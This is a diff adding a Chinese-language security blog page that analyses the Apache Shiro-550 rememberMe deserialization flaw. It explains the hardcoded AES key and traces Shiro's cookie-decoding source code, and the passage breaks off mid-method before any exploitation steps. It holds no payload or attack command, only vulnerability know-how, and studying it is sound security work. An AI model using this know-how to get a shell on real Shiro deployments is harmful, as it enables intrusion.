@@ -1,0 +1,403 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
+  Shiro550
+  #
+
+
+  漏洞原理
+  #
+
+在登录时勾选 RememberMe 字段，登录成功之后返回包的set-Cookie中会有rememberMe=deleteMe字段，同时也会有rememberMe字段，之后所有的请求中 Cookie 都会有 rememberMe 字段，就可以利用这个rememberMe进行反序列化从而 getshell。
+![屏幕截图 2026-08-21 202837](/images/screenshots/屏幕截图 2026-08-21 202837.png)
+Shiro1.2.4 及之前的版本中，AES 加密的密钥默认硬编码在代码里（Shiro-550），Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。
+
+  漏洞分析
+  #
+
+抓包之后看到这个 Cookie 很明显是经过加密的。因为我们平常的 Cookie 都是比较短的，而 shiro RememberMe 字段的 Cookie 太长了。
+
+  分析解密过程
+  #
+
+在 IDEA 中双击 shift 进行全局搜索 Cookie，在 shiro 的包中找到一个类CookieRememberMeManager，关注其中的getRememberedSerializedIdentity()这个方法上。
+protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {
+
+	if (!WebUtils.isHttp(subjectContext)) {
+		if (log.isDebugEnabled()) {
+			String msg = "SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a " +
+				"servlet request and response in order to retrieve the rememberMe cookie. Returning " +
+				"immediately and ignoring rememberMe operation.";
+			log.debug(msg);
+		}
+		return null;
+	}
+
+	WebSubjectContext wsc = (WebSubjectContext) subjectContext;
+	if (isIdentityRemoved(wsc)) {
+		return null;
+	}
+
+	HttpServletRequest request = WebUtils.getHttpRequest(wsc);
+	HttpServletResponse response = WebUtils.getHttpResponse(wsc);
+
+	String base64 = getCookie().readValue(request, response);
+	// Browsers do not always remove cookies immediately (SHIRO-183)
+	// ignore cookies that are scheduled for removal
+    //如果cookie是deleteMe直接返回null
+	if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;
+
+	if (base64 != null) {
+		base64 = ensurePadding(base64); //确保base64字符串的完整性
+		if (log.isTraceEnabled()) {
+			log.trace("Acquired Base64 encoded identity [" + base64 + "]");
+		}
+		byte[] decoded = Base64.decode(base64);
+		if (log.isTraceEnabled()) {
+			log.trace("Base64 decoded byte array length: " + (decoded != null ? decoded.length : 0) + " bytes.");
+		}
+		return decoded;
+	} else {
+		//no cookie set - new site visitor?
+		return null;
+	}
+}
+首先判断是不是 HTTP 请求，如果是，就获取 cookie 中 rememberMe 的值，然后判断是否是 deleteMe，然后判断是否符合 base64 的编码长度，然后进行 base64 解码，将解码结果返回。'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/shiro550/"><meta property="og:site_name" content="Solowalker"><meta property="og:title" content="Shiro550"><meta property="og:description" content='Shiro550 # 漏洞原理 # 在登录时勾选 RememberMe 字段，登录成功之后返回包的set-Cookie中会有rememberMe=deleteMe字段，同时也会有rememberMe字段，之后所有的请求中 Cookie 都会有 rememberMe 字段，就可以利用这个rememberMe进行反序列化从而 getshell。
+![屏幕截图 2026-08-21 202837](/images/screenshots/屏幕截图 2026-08-21 202837.png)
+Shiro1.2.4 及之前的版本中，AES 加密的密钥默认硬编码在代码里（Shiro-550），Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。
+漏洞分析 # 抓包之后看到这个 Cookie 很明显是经过加密的。因为我们平常的 Cookie 都是比较短的，而 shiro RememberMe 字段的 Cookie 太长了。
+分析解密过程 # 在 IDEA 中双击 shift 进行全局搜索 Cookie，在 shiro 的包中找到一个类CookieRememberMeManager，关注其中的getRememberedSerializedIdentity()这个方法上。
+protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) { if (!WebUtils.isHttp(subjectContext)) { if (log.isDebugEnabled()) { String msg = "SubjectContext argument is not an HTTP-aware instance. This is required to obtain a " + "servlet request and response in order to retrieve the rememberMe cookie. Returning " + "immediately and ignoring rememberMe operation."; log.debug(msg); } return null; } WebSubjectContext wsc = (WebSubjectContext) subjectContext; if (isIdentityRemoved(wsc)) { return null; } HttpServletRequest request = WebUtils.getHttpRequest(wsc); HttpServletResponse response = WebUtils.getHttpResponse(wsc); String base64 = getCookie().readValue(request, response); // Browsers do not always remove cookies immediately (SHIRO-183) // ignore cookies that are scheduled for removal //如果cookie是deleteMe直接返回null if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null; if (base64 != null) { base64 = ensurePadding(base64); //确保base64字符串的完整性 if (log.isTraceEnabled()) { log.trace("Acquired Base64 encoded identity [" + base64 + "]"); } byte[] decoded = Base64.decode(base64); if (log.isTraceEnabled()) { log.trace("Base64 decoded byte array length: " + (decoded != null ? decoded.length : 0) + " bytes."); } return decoded; } else { //no cookie set - new site visitor? return null; } } 首先判断是不是 HTTP 请求，如果是，就获取 cookie 中 rememberMe 的值，然后判断是否是 deleteMe，然后判断是否符合 base64 的编码长度，然后进行 base64 解码，将解码结果返回。'><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2026-08-21T00:00:00+00:00"><meta property="article:modified_time" content="2026-08-21T00:00:00+00:00"><title>Shiro550 | Solowalker</title><link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/shiro550/><link rel=stylesheet href=/book.min.486a8282693a4a89ef6d1ebdc674ee9b43f9f237acb69d384c1b5a6a223d858d.css integrity="sha256-SGqCgmk6SonvbR69xnTum0P58jestp04TBtaaiI9hY0=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.d88d75d1e54a45708421076d438e3056b00be462cb3b73b67f1335d26b4c3a62.js integrity="sha256-2I110eVKRXCEIQdtQ44wVrAL5GLLO3O2fxM10mtMOmI=" crossorigin=anonymous></script></head><body dir=ltr><header class=top-header><div class=top-header-inner><div class=top-header-left><img src=/images/logo/solowalker.png alt=Logo class=top-header-logo>
+<a href=https://s0lowalker.github.io/ class=top-header-title>Solowalker</a></div><div class=top-header-right><a href=/friends>友链</a>
+<a href=https://github.com/s0lowalker target=_blank rel=noopener>GitHub</a></div></div></header><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/images/logo/solowalker.png alt=Logo class=book-icon><span>Solowalker</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-5727aa49b051f298f64d3a0dfcdaac79 class=toggle checked>
+<label for=section-5727aa49b051f298f64d3a0dfcdaac79 class="flex justify-between"><a role=button>Java安全</a></label><ul><li><input type=checkbox id=section-f3baf843ac4871d7cc6c9747f091d4ee class=toggle checked>
+<label for=section-f3baf843ac4871d7cc6c9747f091d4ee class="flex justify-between"><a role=button>Java攻防</a></label><ul><li><input type=checkbox id=section-5c8ca639d1baf5e5418b2e7f2608a8f1 class=toggle checked>
+<label for=section-5c8ca639d1baf5e5418b2e7f2608a8f1 class="flex justify-between"><a role=button>Shiro反序列化</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/shiro721/>Shiro721</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/shiro550/ class=active>Shiro550</a></li></ul></li><li><input type=checkbox id=section-db4f1366364f6e3bdeccbe9d6728217c class=toggle>
+<label for=section-db4f1366364f6e3bdeccbe9d6728217c class="flex justify-between"><a role=button>Java反序列化之CC链</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc11/>java反序列化之CC11</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcb/>java反序列化之CB</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc7/>java反序列化之CC7</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc5/>java反序列化之CC5</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2/>java反序列化之CC2</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc4/>java反序列化之CC4</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc3/>java反序列化之CC3</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc6/>java反序列化之CC6</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc1/>Java反序列化之CC1</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Burldns%E9%93%BE/>java反序列化之URLDNS链</a></li></ul></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E/>Java常规漏洞</a></li></ul></li><li><input type=checkbox id=section-1dc6eb9f6244b6f677832d892b22dc02 class=toggle>
+<label for=section-1dc6eb9f6244b6f677832d892b22dc02 class="flex justify-between"><a role=button>Java基础</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/jdk%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/>JDK动态代理</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java-io%E6%B5%81/>Java IO流</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/>java类的动态加载</a></li></ul></li></ul></li><li><input type=checkbox id=section-c4d784444933fdccb12cc39e2ab0a411 class=toggle>
+<label for=section-c4d784444933fdccb12cc39e2ab0a411 class="flex justify-between"><a role=button>渗透测试</a></label><ul><li><input type=checkbox id=section-42c6aa109fe86285746031b39529fd8c class=toggle>
+<label for=section-42c6aa109fe86285746031b39529fd8c class="flex justify-between"><a role=button>web开发篇</a></label><ul><li><a href=/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%BC%80%E5%8F%91%E7%AF%87/javaee/>JavaEE</a></li><li><a href=/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%BC%80%E5%8F%91%E7%AF%87/js%E5%BA%94%E7%94%A8/>JS应用</a></li></ul></li><li><input type=checkbox id=section-6f168133498c5817b23bc8b547002dba class=toggle>
+<label for=section-6f168133498c5817b23bc8b547002dba class="flex justify-between"><a role=button>基础入门篇</a></label><ul><li><a href=/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/web%E4%B8%8Eapp%E4%B8%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F/>Web、APP与小程序架构基础</a></li></ul></li></ul></li><li><input type=checkbox id=section-4b8c89e1539cb7bd5cf76bb189686b16 class=toggle>
+<label for=section-4b8c89e1539cb7bd5cf76bb189686b16 class="flex justify-between"><a role=button>项目</a></label><ul><li><input type=checkbox id=section-9d12b352c320cbba4697bac07fbf83f9 class=toggle>
+<label for=section-9d12b352c320cbba4697bac07fbf83f9 class="flex justify-between"><a role=button>JD2M</a></label><ul><li><a href=/docs/%E9%A1%B9%E7%9B%AE/jd2m/jd2m%E6%BA%90%E7%A0%81%E7%90%86%E8%A7%A3%E8%AE%B0%E5%BD%95/>JD2M源码分析</a></li><li><a href=/docs/%E9%A1%B9%E7%9B%AE/jd2m/jd2m%E6%8A%80%E6%9C%AF%E6%A0%88%E6%88%91%E7%9A%84java%E5%8F%8D%E7%BC%96%E8%AF%91%E5%99%A8/>JD2M技术栈——我的Java反编译器</a></li></ul></li></ul></li><li><input type=checkbox id=section-d8d720db18be1ec4b3cb1ef74548db97 class=toggle>
+<label for=section-d8d720db18be1ec4b3cb1ef74548db97 class="flex justify-between"><a role=button>Web安全</a></label><ul><li><input type=checkbox id=section-31e4da0a6a404b93aaf2d9c04b32c84b class=toggle>
+<label for=section-31e4da0a6a404b93aaf2d9c04b32c84b class="flex justify-between"><a role=button>SQL注入</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/sqlite%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/>SQLite下的SQL注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/%E5%88%A9%E7%94%A8handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/>堆叠注入之利用handler语句获取数据</a></li></ul></li><li><input type=checkbox id=section-2885e3a564b8fe445048e1de37bef089 class=toggle>
+<label for=section-2885e3a564b8fe445048e1de37bef089 class="flex justify-between"><a role=button>SSTI</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/jinja2%E6%A8%A1%E6%9D%BF%E4%B8%8B%E9%9D%9E%E5%B8%B8%E8%A7%81%E7%9A%84ssti/>Jinja2常见关键字被ban后的SSTI</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/twig%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之twig</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/tornado%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之Tornado</a></li></ul></li><li><input type=checkbox id=section-172f63492c2abb7577d01d4bf0de9853 class=toggle>
+<label for=section-172f63492c2abb7577d01d4bf0de9853 class="flex justify-between"><a role=button>文件上传</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E4%B8%8D%E5%90%ABphp%E4%BB%A3%E7%A0%81%E7%9A%84php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce/>PHP文件上传不含PHP代码实现RCE的方法</a></li></ul></li><li><input type=checkbox id=section-958f36f10c11df5112dde6c43a89cde5 class=toggle>
+<label for=section-958f36f10c11df5112dde6c43a89cde5 class="flex justify-between"><a role=button>XXE</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/xxe/apache_tika_xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/>Apache Tika XXE漏洞(CVE-2025-66516)</a></li></ul></li><li><input type=checkbox id=section-db3c5efb4a73093a1b77095b857638ed class=toggle>
+<label for=section-db3c5efb4a73093a1b77095b857638ed class="flex justify-between"><a role=button>代码审计</a></label><ul><li><input type=checkbox id=section-2641018cca6e6013f05f7d61b80b4d11 class=toggle>
+<label for=section-2641018cca6e6013f05f7d61b80b4d11 class="flex justify-between"><a role=button>DVWA审计篇</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/>DVWA代码审计之命令注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81/>DVWA代码审计之不安全的验证码</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/>DVWA代码审计之暴力破解</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/>DVWA代码审计之SQL注入</a></li></ul></li></ul></li></ul></li><li><input type=checkbox id=section-87a84385a267f81ae181c29190fbccaf class=toggle>
+<label for=section-87a84385a267f81ae181c29190fbccaf class="flex justify-between"><a role=button>数据库</a></label><ul><li><a href=/docs/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93/>MySQL数据库盲区补充</a></li></ul></li><li><a href=/docs/%E5%8F%8D%E5%BC%B9shell/>反弹shell</a></li><li><a href=/docs/phpmyadmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABcve-2018-12613/>phpMyAdmin文件包含漏洞(CVE-2018-12613)</a></li><li><a href=/docs/node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%92%8C%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/>node.js原型链污染和沙箱逃逸漏洞学习笔记</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Shiro550</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#漏洞原理>漏洞原理</a></li><li><a href=#漏洞分析>漏洞分析</a><ul><li><a href=#分析解密过程>分析解密过程</a></li><li><a href=#分析加密过程>分析加密过程</a></li></ul></li><li><a href=#漏洞利用>漏洞利用</a><ul><li><a href=#漏洞利用思路>漏洞利用思路</a></li></ul></li><li><a href=#漏洞探测>漏洞探测</a><ul><li><a href=#指纹识别>指纹识别</a></li><li><a href=#aes-密钥判断>AES 密钥判断</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=shiro550>Shiro550
+<a class=anchor href=#shiro550>#</a></h1><h2 id=漏洞原理>漏洞原理
+<a class=anchor href=#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86>#</a></h2><p>在登录时勾选 RememberMe 字段，登录成功之后返回包的<code>set-Cookie</code>中会有<code>rememberMe=deleteMe</code>字段，同时也会有<code>rememberMe</code>字段，之后所有的请求中 Cookie 都会有 rememberMe 字段，就可以利用这个<code>rememberMe</code>进行反序列化从而 getshell。</p><p>![屏幕截图 2026-08-21 202837](/images/screenshots/屏幕截图 2026-08-21 202837.png)</p><p>Shiro1.2.4 及之前的版本中，AES 加密的密钥默认<strong>硬编码</strong>在代码里（Shiro-550），Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。</p><h2 id=漏洞分析>漏洞分析
+<a class=anchor href=#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90>#</a></h2><p>抓包之后看到这个 Cookie 很明显是经过加密的。因为我们平常的 Cookie 都是比较短的，而 shiro RememberMe 字段的 Cookie 太长了。</p><h3 id=分析解密过程>分析解密过程
+<a class=anchor href=#%e5%88%86%e6%9e%90%e8%a7%a3%e5%af%86%e8%bf%87%e7%a8%8b>#</a></h3><p>在 IDEA 中双击 shift 进行全局搜索 Cookie，在 shiro 的包中找到一个类<code>CookieRememberMeManager</code>，关注其中的<code>getRememberedSerializedIdentity()</code>这个方法上。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> <span style=color:#a6e22e>getRememberedSerializedIdentity</span>(SubjectContext subjectContext) {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>WebUtils.<span style=color:#a6e22e>isHttp</span>(subjectContext)) {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (log.<span style=color:#a6e22e>isDebugEnabled</span>()) {
+</span></span><span style=display:flex><span>			String msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &#34;</span> <span style=color:#f92672>+</span>
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;servlet request and response in order to retrieve the rememberMe cookie. Returning &#34;</span> <span style=color:#f92672>+</span>
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;immediately and ignoring rememberMe operation.&#34;</span>;
+</span></span><span style=display:flex><span>			log.<span style=color:#a6e22e>debug</span>(msg);
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	WebSubjectContext wsc <span style=color:#f92672>=</span> (WebSubjectContext) subjectContext;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (isIdentityRemoved(wsc)) {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	HttpServletRequest request <span style=color:#f92672>=</span> WebUtils.<span style=color:#a6e22e>getHttpRequest</span>(wsc);
+</span></span><span style=display:flex><span>	HttpServletResponse response <span style=color:#f92672>=</span> WebUtils.<span style=color:#a6e22e>getHttpResponse</span>(wsc);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	String base64 <span style=color:#f92672>=</span> getCookie().<span style=color:#a6e22e>readValue</span>(request, response);
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// Browsers do not always remove cookies immediately (SHIRO-183)</span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// ignore cookies that are scheduled for removal</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>//如果cookie是deleteMe直接返回null</span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (Cookie.<span style=color:#a6e22e>DELETED_COOKIE_VALUE</span>.<span style=color:#a6e22e>equals</span>(base64)) <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (base64 <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>		base64 <span style=color:#f92672>=</span> ensurePadding(base64); <span style=color:#75715e>//确保base64字符串的完整性</span>
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (log.<span style=color:#a6e22e>isTraceEnabled</span>()) {
+</span></span><span style=display:flex><span>			log.<span style=color:#a6e22e>trace</span>(<span style=color:#e6db74>&#34;Acquired Base64 encoded identity [&#34;</span> <span style=color:#f92672>+</span> base64 <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;]&#34;</span>);
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> decoded <span style=color:#f92672>=</span> Base64.<span style=color:#a6e22e>decode</span>(base64);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (log.<span style=color:#a6e22e>isTraceEnabled</span>()) {
+</span></span><span style=display:flex><span>			log.<span style=color:#a6e22e>trace</span>(<span style=color:#e6db74>&#34;Base64 decoded byte array length: &#34;</span> <span style=color:#f92672>+</span> (decoded <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>?</span> decoded.<span style=color:#a6e22e>length</span> : 0) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; bytes.&#34;</span>);
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> decoded;
+</span></span><span style=display:flex><span>	} <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>		<span style=color:#75715e>//no cookie set - new site visitor?</span>
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>首先判断是不是 HTTP 请求，如果是，就获取 cookie 中 rememberMe 的值，然后判断是否是 deleteMe，然后判断是否符合 base64 的编码长度，然后进行 base64 解码，将解码结果返回。</p><p>然后来找谁调用了<code>getRememberedSerializedIdentity()</code>方法。</p><p>找到<code>AbstractRememberMeManager</code>这个类的<code>getRememberedPrincipals()</code>方法。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> PrincipalCollection <span style=color:#a6e22e>getRememberedPrincipals</span>(SubjectContext subjectContext) {
+</span></span><span style=display:flex><span>    PrincipalCollection principals <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> getRememberedSerializedIdentity(subjectContext);
+</span></span><span style=display:flex><span>		<span style=color:#75715e>//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span>
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (bytes <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> bytes.<span style=color:#a6e22e>length</span> <span style=color:#f92672>&gt;</span> 0) {
+</span></span><span style=display:flex><span>			principals <span style=color:#f92672>=</span> convertBytesToPrincipals(bytes, subjectContext);
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>	} <span style=color:#66d9ef>catch</span> (RuntimeException re) {
+</span></span><span style=display:flex><span>		principals <span style=color:#f92672>=</span> onRememberedPrincipalFailure(re, subjectContext);
+</span></span><span style=display:flex><span>	}
